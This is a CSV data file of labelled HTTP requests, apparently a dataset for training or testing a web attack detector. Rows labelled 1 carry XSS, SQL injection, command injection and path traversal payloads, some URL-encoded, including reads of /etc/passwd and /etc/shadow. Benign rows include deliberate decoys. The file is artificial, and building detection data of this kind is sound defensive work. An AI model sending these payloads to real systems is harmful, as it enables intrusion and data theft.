method,url,headers,body,label
GET,/login?query=%3Csvg/onload%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: QDk8fXrWjmQY",,1
POST,/checkout?page=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: 1jHJHzFpLiOd",,0
PUT,/images?ref=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: 7bY2bDfig9mO",,0
POST,/images?file=| whoami,"User-Agent: Mozilla/5.0
X-Request-ID: lOYdt1gWmUBV",,1
PUT,/search?search=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: JaB2gw2gN5ov",,0
PUT,/search?lang=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: RNOVSLKD7MiC",,0
GET,/blog?file=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: s1Gx1OE73MpT",,0
GET,/login?id=<svg/onload=alert(1)>,"User-Agent: Mozilla/5.0
X-Request-ID: eV5idAYawVUg",,1
POST,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: p7Bn7hBrMOby",ref='; DROP TABLE users; --,1
PUT,/docs?query=%257C%2520whoami,"User-Agent: Mozilla/5.0
X-Request-ID: Ba5NyxRLQEdN",,1
POST,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: fdg6eYM6FMbS",lang=%2524%2528whoami%2529,1
PUT,/api/user?q=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: pzhzQzJze45w",,0
PUT,/search,"User-Agent: Mozilla/5.0
X-Request-ID: B31SyH6CnQGH",lang=../../etc/passwd,1
POST,/checkout?file=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: CSZyS4Q1VeEK",,0
PUT,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: Uvu1Z1MnqRSl",q=%3Csvg/onload%3Dalert%281%29%3E,1
POST,/search?page=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: RrOIZUehKrGe",,0
PUT,/search?lang=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: ZOYg1TouF0sO",,0
PUT,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: OC8iMmnhLl2p",id=%24%28whoami%29,1
PUT,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: GidQYCWuBmwp",lang=$(whoami),1
GET,/api/user?id=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: GqnnrPT4sh4S",,0
POST,/docs?id=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: Hc9WAe4C5aVd",,0
GET,/login?search=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: yEmi6CWGC8rf",,0
POST,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: gc4Ktnc2yFTm",id=%27%20OR%201%3D1%20--,1
GET,/images?lang=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: jMJEv25TMYp6",,0
GET,/product,"User-Agent: Mozilla/5.0
X-Request-ID: GBIOotbzPoYh",query=1%2520OR%2520TRUE,1
PUT,/search?file=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: Jg8tG4QE90HG",,0
PUT,/blog?id=....//....//etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: KPWq9FJUZ8Ad",,1
POST,/docs?file=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: DWYC6u43vyRy",,0
PUT,/images?file=%27%3B%20DROP%20TABLE%20users%3B%20--,"User-Agent: Mozilla/5.0
X-Request-ID: wOnseZTvKfIe",,1
PUT,/docs?id=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: dhZMtJQTwUX6",,0
GET,/api/user?ref=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: hhZLqMpobaDb",,0
GET,/docs?file=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: Ik49kDSgyqA2",,0
GET,/api/user?search=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: JJg5eSPqK3mW",,0
PUT,/search?query=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: G2MKjIpBETf0",,0
POST,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: kTkFZslJeWKI",ref=alert%2528String.fromCharCode%252888%252C83%252C83%2529%2529,1
GET,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: zG77wprLZlRF",lang=%3Cscript%3Ealert%281%29%3C/script%3E,1
POST,/search?page=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: dZ5JIZQxziW8",,0
PUT,/login?query=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: yJCbt2Sr8i3t",,0
PUT,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: zPzfD6OWg7jr",file=alert%28String.fromCharCode%2888%2C83%2C83%29%29,1
PUT,/login?q=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: C1sD7Azg1zN4",,0
PUT,/images?id=&& cat /etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: RyYn8k8vv9p7",,1
PUT,/login,"User-Agent: Mozilla/5.0
X-Request-ID: CDS1pCaH3phs",q=%3Cscript%3Ealert%281%29%3C/script%3E,1
GET,/product?page=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: 4CrotFKXshCe",,0
GET,/search?page=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: ClEh5UP2YbKX",,0
PUT,/docs?username=$(whoami),"User-Agent: Mozilla/5.0
X-Request-ID: CYDIkGmq80gg",,1
PUT,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: zcnHyHU9vMt7",search=%2527%253B%2520DROP%2520TABLE%2520users%253B%2520--,1
PUT,/docs?ref=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: 9Nv00BLUcvlq",,0
GET,/search,"User-Agent: Mozilla/5.0
X-Request-ID: iqEvtZTk0ZOe",file=%3B%20ls%20-la,1
PUT,/login?query=$(whoami),"User-Agent: Mozilla/5.0
X-Request-ID: CzTq1PnlgKDZ",,1
GET,/api/user?id=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: uw4WQdRgBOw4",,1
POST,/checkout?lang=' AND SLEEP(5)--,"User-Agent: Mozilla/5.0
X-Request-ID: 2syeJGoBErkX",,1
POST,/blog?username=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/5.0
X-Request-ID: T2KgjIPkEtSu",,1
GET,/login?id=%253Cscript%253Ealert%25281%2529%253C/script%253E,"User-Agent: Mozilla/5.0
X-Request-ID: biWCBO9ebioS",,1
POST,/images?search=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: faej2fyJISEl",,0
PUT,/product?lang=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: cIAGKC0drO7V",,1
GET,/docs?query=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: BB2CDZ4KnKcY",,0
POST,/checkout?search=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: drvRcTdXMdjK",,0
GET,/images?search=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: 2VVGOmUZ9ldn",,0
POST,/checkout?q=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: pFlZQUtnJod0",,0
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: d82dV9gTQYVz",id=/etc/shadow,1
POST,/product?ref=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: aIZym1QhFo0x",,0
POST,/login?page=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: 4yLZC6GUtiIF",,0
POST,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: ZKpJ0RtDlg1O",q=%253B%2520ls%2520-la,1
PUT,/blog?file=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: CwWWHQglwCzZ",,0
PUT,/product?search=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: InCgksL8vssP",,0
POST,/product?query=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: I6dWDXZTTwlC",,0
POST,/images,"User-Agent: Mozilla/5.0
X-Request-ID: Zf9apCgXC9XV",id=../../etc/passwd,1
PUT,/checkout?lang=1%20OR%20TRUE,"User-Agent: Mozilla/5.0
X-Request-ID: 9oAeuKOCOn3Z",,1
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: r2BtpUQWPjPM",username=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
POST,/blog?ref=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: SzLwUIDIEaPE",,0
GET,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: P6w7dSyFZHvW",search=alert%28String.fromCharCode%2888%2C83%2C83%29%29,1
POST,/product?page=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: OpwXrcDcjGNF",,0
GET,/images?q=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: Bd86K4ybVKl2",,0
PUT,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: 4ksLsvrNVh21",lang=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
PUT,/api/user?query=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: 8dUYTnLQT5ky",,0
POST,/images?search=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: U6kKL88aul1G",,0
GET,/search?username=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: a91iti93JWtQ",,0
POST,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: IwKrkcTrRv99",page=%253B%2520ls%2520-la,1
GET,/api/user?username=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: aelK84aw4T6I",,0
GET,/docs?lang=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: hpJ4MEcrNrjE",,0
POST,/search?lang=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: U3w6TmExHqhZ",,0
GET,/docs?q=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: mNDGJmMXji1S",,0
POST,/product?username=<script>alert(1)</script>,"User-Agent: Mozilla/5.0
X-Request-ID: 86GcqkokZHy2",,1
GET,/docs?username=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: iawqRCeUvswR",,0
POST,/checkout?lang=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: 3zjnwn6EIKSy",,0
PUT,/search?page=' OR 1=1 --,"User-Agent: Mozilla/5.0
X-Request-ID: WgyVHhqafoto",,1
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: VHjlOsGPcfv7",search=....//....//etc/passwd,1
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: tvvS9WZTWbIz",query=&& cat /etc/passwd,1
GET,/login?q=alert%2528String.fromCharCode%252888%252C83%252C83%2529%2529,"User-Agent: Mozilla/5.0
X-Request-ID: JfbU1fgyj5H2",,1
POST,/checkout?id=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: XHjFUPU0qHIW",,0
PUT,/search?ref=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: vPAMdQTZAcjc",,1
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: 4d3HJvBRKl8H",page=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
GET,"/images?search=' UNION SELECT NULL,NULL --","User-Agent: Mozilla/5.0
X-Request-ID: NbWc0xCD87We",,1
GET,/search?query=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: kWhOtRisF96E",,0
PUT,/docs?lang=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: ji6f3SyC5Ef1",,0
POST,/product?lang=%253Cscript%253Ealert%25281%2529%253C/script%253E,"User-Agent: Mozilla/5.0
X-Request-ID: 00agMPQa4jBl",,1
POST,/blog?ref=&& cat /etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: ZDVJLHvivVEs",,1
POST,/docs?lang=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: lyclU6j6RlUN",,0
PUT,/images?query=alert%2528String.fromCharCode%252888%252C83%252C83%2529%2529,"User-Agent: Mozilla/5.0
X-Request-ID: ppoID9atABKk",,1
GET,/blog?id=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: kAXgFbGlcBCE",,0
POST,/api/user?username=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: VAjvLAUYkb4D",,0
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: LwresHnkVLpY",lang=%7C%20whoami,1
GET,/login?ref=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: Wan4abDpyXc9",,0
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: yvmueydDI84k",query=<script>alert(1)</script>,1
POST,/login?ref=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: til6Ap0RyDcn",,0
POST,/blog?query=%253Cscript%253Ealert%25281%2529%253C/script%253E,"User-Agent: Mozilla/5.0
X-Request-ID: QClXNzAbndLB",,1
POST,/blog?username=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: xlY7uriwUMka",,0
POST,/api/user?id=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: 6PRf84V4k1qD",,1
PUT,/search,"User-Agent: Mozilla/5.0
X-Request-ID: 909le6LhgvSf",lang=%2527%253B%2520DROP%2520TABLE%2520users%253B%2520--,1
POST,/search?search=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: 7iuonG6GXfe2",,1
GET,/login?lang=%27%20UNION%20SELECT%20NULL%2CNULL%20--,"User-Agent: Mozilla/5.0
X-Request-ID: mD2RaYJeH9wP",,1
GET,/checkout?search=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: VlO1rn9YA5Oa",,0
POST,/login?id=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: 0gRh77ARNCo8",,0
POST,/product?query=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: Hc9vlw86FYrd",,0
POST,/blog?q=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: wA2Glg4rUJqy",,0
PUT,/login,"User-Agent: Mozilla/5.0
X-Request-ID: n0UVx8N8wK9S",search=%26%26%20cat%20/etc/passwd,1
POST,/checkout?search=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: 8csRhIWQrcUR",,0
POST,/login?search=%3B%20ls%20-la,"User-Agent: Mozilla/5.0
X-Request-ID: e4yshN40O296",,1
GET,/checkout?search=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: DKOVUL8RwfPW",,0
POST,/product?file=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: hggqKTV6T1Z9",,0
PUT,/blog?query=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: MbjBSHO6hDM9",,0
POST,/product?page=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: jTChqn07F0Rz",,0
PUT,/blog?query=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: YEATUlYsMJY4",,0
POST,/login?search=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: iLLHZO2I6qwE",,0
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: lQCRP05O7U92","id=alert(String.fromCharCode(88,83,83))",1
PUT,/checkout?page=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: ueneavduGgGa",,0
PUT,/images?q=%26%26%20cat%20/etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: WYi5mYNzQzZP",,1
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: ufmGHuVDknkk",file=%3Cscript%3Ealert%281%29%3C/script%3E,1
PUT,/blog?query=' AND SLEEP(5)--,"User-Agent: Mozilla/5.0
X-Request-ID: Cb6c5psad5C4",,1
PUT,/product?ref=$(whoami),"User-Agent: Mozilla/5.0
X-Request-ID: Z0CQU2WYyj7J",,1
GET,/product?id=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: 69KcHIW9i3yr",,0
GET,/api/user?search=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: z4b5wxKdf0a5",,0
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: FoB0Jq4yvFyy",id=1 OR TRUE,1
PUT,/images?username=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: g5JniB2mmsia",,0
PUT,/login,"User-Agent: Mozilla/5.0
X-Request-ID: TLEH2BbiwMGn",username=/etc/shadow,1
PUT,/blog?search=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: 8ZVZnqRBj05h",,0
PUT,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: xccddhZQv3jT",search=<svg/onload=alert(1)>,1
POST,/search?search=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: wqkEbJCW9Q4L",,1
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: qEcGaV46urIi",ref=%3Csvg/onload%3Dalert%281%29%3E,1
POST,/login?q=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: 8wN7r4m0qXve",,0
PUT,/search,"User-Agent: Mozilla/5.0
X-Request-ID: OgUuQAywoF4M",query=' OR 1=1 --,1
PUT,/search?page=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: uDqstSjIW0ea",,0
GET,/checkout?id=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: uBB6dG8KprHr",,0
POST,/search?id=1 OR TRUE,"User-Agent: Mozilla/5.0
X-Request-ID: gEFgLgQHaaLo",,1
POST,/images?ref=%253B%2520ls%2520-la,"User-Agent: Mozilla/5.0
X-Request-ID: wL8tS37kwslc",,1
GET,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: 4R1u51ikEorJ",search=%257C%2520whoami,1
GET,/checkout?q=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: D564RGyi1c6K",,0
POST,/product?search=<img src=x onerror=alert(1)>,"User-Agent: Mozilla/5.0
X-Request-ID: EFNw29TDqCwj",,1
PUT,/images?username=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: PXOfRPAmjKW9",,1
GET,/blog?ref=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: ao8NvAlL8L5n",,0
PUT,/checkout?search=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: YUQsmQQH16Np",,0
PUT,/search?file=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: VvPN5hdX2ZnG",,0
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: 587gLINqgsuq",search=' OR 1=1 --,1
PUT,/api/user?page=/etc/shadow,"User-Agent: Mozilla/5.0
X-Request-ID: p9TKZTepfUQN",,1
POST,/search?q=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: 0ko4ArvawYzw",,0
GET,/search,"User-Agent: Mozilla/5.0
X-Request-ID: SgD8MkNxoLwo",page=%2527%2520OR%25201%253D1%2520--,1
PUT,/checkout?ref=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: eh3ajn6Akj8F",,0
PUT,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: NAbfafxbNX36",id=%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,1
POST,/search?file=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: jDStzsU9Di14",,0
GET,/product?ref=$(whoami),"User-Agent: Mozilla/5.0
X-Request-ID: BpNDAUrHiuT1",,1
GET,/product?query=| whoami,"User-Agent: Mozilla/5.0
X-Request-ID: p4tV4OBIRuUP",,1
PUT,/images?page=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: T42ndx5bxN4H",,0
GET,/blog?q=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: d2W128ENuxnJ",,0
GET,/images?q=| whoami,"User-Agent: Mozilla/5.0
X-Request-ID: C1wDAGlUMztn",,1
GET,/api/user?id=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: zTkoEiSr0J5T",,0
PUT,/product?id=%2527%2520AND%2520SLEEP%25285%2529--,"User-Agent: Mozilla/5.0
X-Request-ID: aXOTRoZACSld",,1
POST,/product?q=' AND SLEEP(5)--,"User-Agent: Mozilla/5.0
X-Request-ID: 5pPGq4NeASpW",,1
PUT,/checkout?ref=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: hf61SctAKBxg",,0
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: zENPOVjfCjeG",q=....//....//etc/passwd,1
PUT,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: MbLUcnoQLOul",file=$(whoami),1
PUT,/product?ref=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: PZxuMPvM9UPN",,0
PUT,/checkout?ref=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: YJ4cYF9yvcC9",,0
POST,/product?query=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: 2ZVldjwGWugw",,0
POST,/api/user?q=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: ThYrOfOzOHlE",,0
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: oPRcHZ1sdajj",file=....//....//etc/passwd,1
GET,"/docs?search=alert(String.fromCharCode(88,83,83))","User-Agent: Mozilla/5.0
X-Request-ID: a4kNnPa3NiWW",,1
GET,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: VKe932oDr2hc",page=../../etc/passwd,1
PUT,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: MCjiSTzSehg8",page=/etc/shadow,1
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: 0gXOOegqd7sv",q=....//....//etc/passwd,1
POST,/checkout?ref=%2527%2520UNION%2520SELECT%2520NULL%252CNULL%2520--,"User-Agent: Mozilla/5.0
X-Request-ID: AxY0UzsbmDl2",,1
POST,/images,"User-Agent: Mozilla/5.0
X-Request-ID: VOIqjiFHT9Eu",q=alert%2528String.fromCharCode%252888%252C83%252C83%2529%2529,1
POST,/checkout?id=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: DQDeQhiOmfj6",,0
POST,/login?search=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: KWvh2tCVESTr",,0
POST,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: SmT3xWZoyuGQ",lang=&& cat /etc/passwd,1
GET,/blog?query=%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,"User-Agent: Mozilla/5.0
X-Request-ID: XODSINvppH0H",,1
PUT,/docs?ref=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: KPoswocuTx1j",,0
GET,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: flMnoPpmMhI7",file=%26%26%20cat%20/etc/passwd,1
GET,/api/user?search=%253Cscript%253Ealert%25281%2529%253C/script%253E,"User-Agent: Mozilla/5.0
X-Request-ID: oVF7gO8H78wG",,1
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: ZaajYYXCLrCm",search=../../etc/passwd,1
POST,/blog?page=%257C%2520whoami,"User-Agent: Mozilla/5.0
X-Request-ID: h0DJLnKNu0y0",,1
POST,/images?id=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: 6rMdwf8jd997",,0
PUT,/checkout?q=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: NOFaa6I6Ctsj",,0
GET,/images?id=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: v8IkTwWG6nD7",,0
PUT,/checkout?page=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: eym4vxipRD5b",,0
PUT,/api/user?id=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/5.0
X-Request-ID: 67t1OLW8ij7K",,1
PUT,/login,"User-Agent: Mozilla/5.0
X-Request-ID: BHAFCdB1ZcX7",id=1 OR TRUE,1
POST,/docs?username=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: lCs6i5ah6dal",,0
PUT,/login?file=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: fCLdnAunK0WR",,0
POST,/api/user?file=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: q0wCGZV03xuS",,0
PUT,/product?lang=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: DIUK4TwXhL6e",,0
GET,/search,"User-Agent: Mozilla/5.0
X-Request-ID: 7tvElq2yZMSE",id=%27%20AND%20SLEEP%285%29--,1
POST,/checkout?search=$(whoami),"User-Agent: Mozilla/5.0
X-Request-ID: 4LW3P1nFazNR",,1
POST,/api/user?lang=%27%3B%20DROP%20TABLE%20users%3B%20--,"User-Agent: Mozilla/5.0
X-Request-ID: 9tcFrfSlSeTV",,1
PUT,/api/user?query=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: qKNeeiPsOXyd",,0
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: AOQyzg5JocFj",username=; ls -la,1
GET,/images?file=%253Csvg/onload%253Dalert%25281%2529%253E,"User-Agent: Mozilla/5.0
X-Request-ID: gIF04ax0unJy",,1
POST,/search?search=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: JUzIjnXcDHbY",,0
GET,/api/user?q=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: Eh5l3wv47N1l",,0
PUT,/product?search=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: SL5GpXAdQKfb",,0
POST,/product,"User-Agent: Mozilla/5.0
X-Request-ID: IV9vsYvPnz66","q=' UNION SELECT NULL,NULL --",1
GET,/product,"User-Agent: Mozilla/5.0
X-Request-ID: asheZdwDicOb","username=' UNION SELECT NULL,NULL --",1
GET,/images?search=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: jlfWtunXpm2s",,0
PUT,/images?page=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: Lo1Q4wI0ocla",,0
POST,/blog?query=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: HJ7uIEFnALjE",,0
PUT,/api/user?ref=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: 6xxJNryWOxhc",,0
POST,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: BBZJInUzIyn3","lang=' UNION SELECT NULL,NULL --",1
PUT,/docs?query=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: mxpFtds8s2pf",,0
PUT,/product?file=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: 1E26Afs65fWE",,0
PUT,/login?file=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: rS0ILVA5bOdu",,0
PUT,/search,"User-Agent: Mozilla/5.0
X-Request-ID: GPb8jLBU0Il9",query=| whoami,1
POST,/login?q=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: lH2TwYvMRXH2",,0
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: hQ1EKmJg7NSg","search=alert(String.fromCharCode(88,83,83))",1
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: DPTNQTsmdylt",username=| whoami,1
POST,/product?username=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: RDwe6dHLShsJ",,0
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: 59gI4Wn30fQ8",q=%2527%2520AND%2520SLEEP%25285%2529--,1
POST,/api/user?file=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/5.0
X-Request-ID: 49i4ygQIg3YM",,1
